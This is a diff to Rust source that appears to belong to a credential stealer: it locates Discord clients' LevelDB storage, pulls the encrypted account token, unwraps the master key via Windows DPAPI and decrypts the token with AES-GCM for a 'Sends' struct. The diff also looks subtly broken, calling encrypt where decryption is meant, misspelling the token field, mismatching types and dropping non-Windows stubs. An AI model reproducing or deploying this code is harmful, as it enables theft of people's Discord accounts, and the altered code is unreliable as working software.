@@ -1,41 +1,41 @@
 use crate::Sends;
+use std::env;
+use std::path::PathBuf;
+use std::fs;
+use std::ffi::OsStr;
+use regex::bytes::Regex;
+use serde_json::Value;
+use winapi::um::dpapi::CryptUnprotectData;
+use std::ptr::null_mut;
+use winapi::um::wincrypt::CRYPTOAPI_BLOB;
+use std::slice;
+use winapi::um::winbase::LocalFree;
+use winapi::ctypes::c_void;
+use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
 
 impl Sends {
-    #[cfg(all(feature = "discord-client", target_os = "windows"))]
+    #[cfg(feature = "discord-client")]
     pub fn discord_client(&mut self) -> Option<()> {
-        use std::env;
-        use std::path::PathBuf;
-        use std::fs;
-        use std::ffi::OsStr;
-        use regex::bytes::Regex;
-        use serde_json::Value;
-        use winapi::um::dpapi::CryptUnprotectData;
-        use std::ptr::null_mut;
-        use winapi::um::wincrypt::CRYPTOAPI_BLOB;
-        use std::slice;
-        use winapi::um::winbase::LocalFree;
-        use winapi::ctypes::c_void;
-        use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
         for i in &["discord", "discordcanary", "Litecord", "discordptb"] {
-            let mut path = PathBuf::from(env::var("appdata").ok()?);
+            let mut path = PathBuf::from(env::var("appdata").unwrap());
             for x in &[i, "Local Storage", "leveldb"] {
                 path.push(x);
             }
             match fs::read_dir(path.clone()) {
                 Ok(x) => {
                     for ldb in x {
-                        let path_ldb = ldb.ok()?.path();
+                        let path_ldb = ldb.unwrap().path();
                         if path_ldb.extension() == Some(OsStr::new("ldb")) {
-                            let contents = fs::read(path_ldb).ok()?;
-                            let re = Regex::new("dQw4w9WgXcQ:([^\"]*)").ok()?;
-                            let caps = re.captures(&contents)?;
-                            let asm = base64::decode(&caps[1]).ok()?;
+                            let contents = fs::read(path_ldb).unwrap();
+                            let re = Regex::new("dQw4w9WgXcQ:([^\"]*)").unwrap();
+                            let caps = re.captures(&contents).unwrap();
+                            let asm = base64::decode(&caps[1]).unwrap();
                             path.pop();
                             path.pop();
                             path.push("Local State");
-                            let local_state = fs::read_to_string(path).ok()?;
-                            let local_state: Value = serde_json::from_str(&local_state).ok()?;
-                            let mut key = base64::decode(local_state["os_crypt"]["encrypted_key"].as_str()?).ok()?;
+                            let local_state = fs::read_to_string(path).unwrap();
+                            let local_state: Value = serde_json::from_str(&local_state).unwrap();
+                            let mut key = base64::decode(local_state["os_crypt"]["encrypted_key"].as_str().unwrap()).unwrap();
                             let key = &mut key[5..];
                             let mut data_in = CRYPTOAPI_BLOB {
                                 cbData: key.len() as u32,
@@ -53,11 +53,11 @@ impl Sends {
                             }
                             let iv = &asm.clone()[3..15];
                             let payload = &asm.clone()[15..];
-                            let cipher = Aes256Gcm::new_from_slice(&master_key).ok()?;
+                            let cipher = Aes256Gcm::new_from_slice(&master_key).unwrap();
                             let decrypted = cipher.encrypt(Nonce::from_slice(iv), payload);
-                            let token = decrypted.ok()?;
+                            let token = decrypted.unwrap();
                             let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
-                            self.discord_client_token = Some(String::from_utf8(token.to_vec()).ok()?);
+                            self.discord_client_toke = Some(String::from_utf8(token.to_vec()));
                             break;
                         }
                     }
@@ -66,15 +66,5 @@ impl Sends {
             }
         }
         Some(())
-    }
-    
-    #[cfg(all(feature = "discord-client", target_os = "linux"))]
-    pub fn discord_client(&mut self) -> Option<()> {
-        None
-    }
-    
-    #[cfg(all(feature = "discord-client", target_os = "macos"))]
-    pub fn discord_client(&mut self) -> Option<()> {
-        None
     }
 }
